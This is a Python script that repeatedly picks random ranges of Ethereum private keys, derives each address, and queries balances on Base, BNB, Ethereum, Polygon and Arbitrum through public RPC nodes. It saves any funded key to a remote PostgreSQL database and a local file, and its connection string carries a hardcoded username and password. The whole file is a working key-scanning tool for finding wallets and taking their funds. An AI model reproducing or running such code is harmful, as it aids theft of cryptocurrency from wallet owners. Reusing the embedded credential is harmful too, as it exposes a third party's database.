from web3 import Web3
import psycopg2
import random
import blocksmith
import sys
import bitcoin
import json
import requests
#w3 = Web3(Web3.WebsocketProvider('wss://ethereum-sepolia-rpc.publicnode.com'))
w3_base= Web3(Web3.HTTPProvider('https://base-rpc.publicnode.com'))
w3_bnb = Web3(Web3.HTTPProvider('https://bsc-rpc.publicnode.com'))
w3_eth = Web3(Web3.WebsocketProvider('wss://ethereum-rpc.publicnode.com'))
w3_polygon = Web3(Web3.HTTPProvider('https://polygon-bor-rpc.publicnode.com'))
w3_arbitrum = Web3(Web3.HTTPProvider('https://arbitrum-one-rpc.publicnode.com'))
providers = [w3_base,w3_bnb,w3_eth,w3_polygon,w3_arbitrum]
psqlurl = "postgresql://onlytiza2001:gSxZO62zJViM@ep-bitter-mouse-a2imk5dm.eu-central-1.aws.neon.tech/db-adminjs?sslmode=require&options=endpoint%3Dep-bitter-mouse-a2imk5dm"
conn = psycopg2.connect(psqlurl)
cur = conn.cursor()

def balance_checker(address):
    flouss = 0
    
    for provider in providers:
        try:
            eth_balance = provider.eth.get_balance(address)
            
            eth_balance = provider.from_wei(eth_balance,'ether')
            flouss = flouss +eth_balance
        except:
            pass
    return flouss

def hola(num):
    keysperpage = 128
    totalpages= 904625697166532776746648320380374280100293470930272690489102837043110636675
    keys = {}
    pagenumber= int(num)
    basepage = pagenumber-1
    firstseed= basepage*keysperpage
    for j in range(firstseed,firstseed+keysperpage-1):
        privatekey = '{:064x}'.format(j+1)
        publickey = str(blocksmith.EthereumWallet.generate_address(privatekey))
        ## gr
        keys[publickey]=privatekey
        print(publickey)
        checksum_address = Web3.to_checksum_address(publickey)
        balance =balance_checker(checksum_address)
        print(balance)
        if balance>0:
            balance = str(balance)
            cur.execute("INSERT INTO result (wallet,key,balance) VALUES (%s,%s,%s)",(publickey,privatekey,balance))
            conn.commit()
            print(("Public key: "+publickey+" Private key: "+privatekey+ " Balance: "+balance+"\n") )
            with open("keys.txt", "a") as myfile:
                            myfile.write("Public key: "+publickey+" Private key: "+privatekey+ " Balance: "+balance+"\n") 


while(1):
     rand = random.randint(1,904625697166532776746648320380374280100293470930272690489102837043110636675)
     hola(rand)